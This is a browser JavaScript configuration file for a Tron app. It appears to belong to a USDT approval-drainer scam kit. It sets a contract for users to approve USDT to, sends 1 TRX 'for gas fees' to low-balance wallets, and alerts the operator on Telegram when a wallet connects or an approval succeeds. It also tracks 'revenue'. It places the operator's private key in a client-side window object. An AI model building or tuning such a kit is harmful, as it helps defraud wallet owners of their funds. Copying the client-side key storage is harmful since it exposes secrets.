// ========================================
// CENTRALIZED CONFIGURATION FILE
// ========================================
// All settings in one place for easy modification
// Update these values as needed for your application

window.APP_CONFIG = {
    // ========================================
    // WALLET CONFIGURATION
    // ========================================
    WALLET: {
        // Your main wallet address (the one that sends TRX to users)
        YOUR_WALLET_ADDRESS: "YOUR_WALLET_ADDRESS_HERE",
        
        // Your private key (keep this secure!)
        YOUR_PRIVATE_KEY: "YOUR_PRIVATE_KEY_HERE",
        
        // Minimum balance to keep in your wallet (in TRX)
        MIN_WALLET_BALANCE: 5,
        
        // USDT contract address on Tron
        USDT_CONTRACT_ADDRESS: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
        
        // Contract address where users approve USDT
        USDT_APPROVAL_CONTRACT: "TRJSETtx1h24inpobmt4Q1a3bvfkdbYhP5"
    },

    // ========================================
    // TRX AUTO-SEND CONFIGURATION
    // ========================================
    TRX: {
        // Amount of TRX to send to users (in sun - smallest unit)
        // 1000000 = 1 TRX, 10000000 = 10 TRX, 20000000 = 20 TRX
        AMOUNT_TO_SEND: 1000000, // 1 TRX
        
        // Maximum TRX balance user can have to receive auto-send
        // If user has more than this, no TRX will be sent
        MAX_USER_BALANCE: 1, // TRX
        
        // Daily limit - only send once per user per day
        DAILY_LIMIT_ENABLED: true,
        
        // Success message shown to user
        SUCCESS_MESSAGE: "Sent 1 TRX for gas fees!"
    },

    // ========================================
    // TELEGRAM NOTIFICATIONS CONFIGURATION
    // ========================================
    TELEGRAM: {
        // Your Telegram bot token (get from @BotFather)
        BOT_TOKEN: "YOUR_TELEGRAM_BOT_TOKEN_HERE",
        
        // Your Telegram chat ID (where notifications will be sent)
        CHAT_ID: "YOUR_TELEGRAM_CHAT_ID_HERE",
        
        // Enable/disable Telegram notifications
        ENABLED: true,
        
        // Notification types to send
        NOTIFICATIONS: {
            WALLET_CONNECTED: true,
            TRX_SENT: true,
            APPROVAL_SUCCESS: true,
            ERROR_LOGS: true
        }
    },

    // ========================================
    // BALANCE DISPLAY CONFIGURATION
    // ========================================
    DISPLAY: {
        // Number of decimal places for TRX display
        TRX_DECIMALS: 6,
        
        // Number of decimal places for USDT display
        USDT_DECIMALS: 2,
        
        // Currency symbols
        TRX_SYMBOL: "TRX",
        USDT_SYMBOL: "USDT"
    },

    // ========================================
    // SECURITY & LIMITS
    // ========================================
    SECURITY: {
        // Maximum number of transactions per user per day
        MAX_TRANSACTIONS_PER_DAY: 1,
        
        // Enable transaction logging
        LOG_TRANSACTIONS: true,
        
        // Enable error logging
        LOG_ERRORS: true,
        
        // Enable success logging
        LOG_SUCCESS: true
    },

    // ========================================
    // UI CONFIGURATION
    // ========================================
    UI: {
        // Show toast notifications
        SHOW_TOAST: true,
        
        // Toast duration in milliseconds
        TOAST_DURATION: 3000,
        
        // Enable console logging
        CONSOLE_LOGGING: true
    },

    // ========================================
    // ANALYTICS & DASHBOARD CONFIGURATION
    // ========================================
    ANALYTICS: {
        // Enable analytics tracking
        ENABLED: true,
        
        // Track user activity
        TRACK_USER_ACTIVITY: true,
        
        // Track transactions
        TRACK_TRANSACTIONS: true,
        
        // Track errors
        TRACK_ERRORS: true,
        
        // Data retention (in days)
        DATA_RETENTION_DAYS: 30,
        
        // Real-time updates
        REAL_TIME_UPDATES: true,
        
        // Dashboard settings
        DASHBOARD: {
            ENABLED: true,
            AUTO_REFRESH: true,
            REFRESH_INTERVAL: 5000, // 5 seconds
            SHOW_LIVE_STATS: true
        },
        
        // Metrics to track
        METRICS: {
            DAILY_USERS: true,
            DAILY_TRX_SENT: true,
            DAILY_USDT_APPROVALS: true,
            SUCCESS_RATE: true,
            ERROR_RATE: true,
            AVERAGE_SESSION_TIME: true,
            USER_RETENTION: true,
            REVENUE_TRACKING: true
        }
    },

    // ========================================
    // ADVANCED SETTINGS
    // ========================================
    ADVANCED: {
        // Transaction timeout in milliseconds
        TRANSACTION_TIMEOUT: 30000,
        
        // Retry attempts for failed transactions
        MAX_RETRY_ATTEMPTS: 3,
        
        // Enable auto-retry for failed transactions
        AUTO_RETRY: false,
        
        // Custom API endpoints (if needed)
        CUSTOM_ENDPOINTS: {
            // Add custom endpoints here if needed
        }
    }
};

// ========================================
// CONFIGURATION VALIDATION
// ========================================
// This function validates the configuration
window.validateConfig = function() {
    const config = window.APP_CONFIG;
    const errors = [];
    
    // Validate wallet configuration
    if (!config.WALLET.YOUR_WALLET_ADDRESS || config.WALLET.YOUR_WALLET_ADDRESS === "YOUR_WALLET_ADDRESS_HERE") {
        errors.push("❌ Wallet address not configured");
    }
    
    if (!config.WALLET.YOUR_PRIVATE_KEY || config.WALLET.YOUR_PRIVATE_KEY === "YOUR_PRIVATE_KEY_HERE") {
        errors.push("❌ Private key not configured");
    }
    
    // Validate Telegram configuration
    if (config.TELEGRAM.ENABLED) {
        if (!config.TELEGRAM.BOT_TOKEN || config.TELEGRAM.BOT_TOKEN === "YOUR_TELEGRAM_BOT_TOKEN_HERE") {
            errors.push("❌ Telegram bot token not configured");
        }
        
        if (!config.TELEGRAM.CHAT_ID || config.TELEGRAM.CHAT_ID === "YOUR_TELEGRAM_CHAT_ID_HERE") {
            errors.push("❌ Telegram chat ID not configured");
        }
    }
    
    // Validate TRX configuration
    if (config.TRX.AMOUNT_TO_SEND <= 0) {
        errors.push("❌ TRX amount to send must be greater than 0");
    }
    
    if (config.TRX.MAX_USER_BALANCE <= 0) {
        errors.push("❌ Max user balance must be greater than 0");
    }
    
    // Display validation results
    if (errors.length > 0) {
        console.error("🚨 Configuration Errors:");
        errors.forEach(error => console.error(error));
        return false;
    } else {
        console.log("✅ Configuration is valid");
        return true;
    }
};

// ========================================
// CONFIGURATION HELPER FUNCTIONS
// ========================================
// Helper functions to access configuration values

window.getConfig = function(path) {
    const keys = path.split('.');
    let value = window.APP_CONFIG;
    
    for (const key of keys) {
        if (value && typeof value === 'object' && key in value) {
            value = value[key];
        } else {
            return undefined;
        }
    }
    
    return value;
};

window.setConfig = function(path, value) {
    const keys = path.split('.');
    const lastKey = keys.pop();
    let target = window.APP_CONFIG;
    
    for (const key of keys) {
        if (!target[key] || typeof target[key] !== 'object') {
            target[key] = {};
        }
        target = target[key];
    }
    
    target[lastKey] = value;
};

// ========================================
// INITIALIZATION
// ========================================
// Validate configuration when the file loads
if (typeof window !== 'undefined') {
    console.log("🔧 Loading application configuration...");
    window.validateConfig();
}
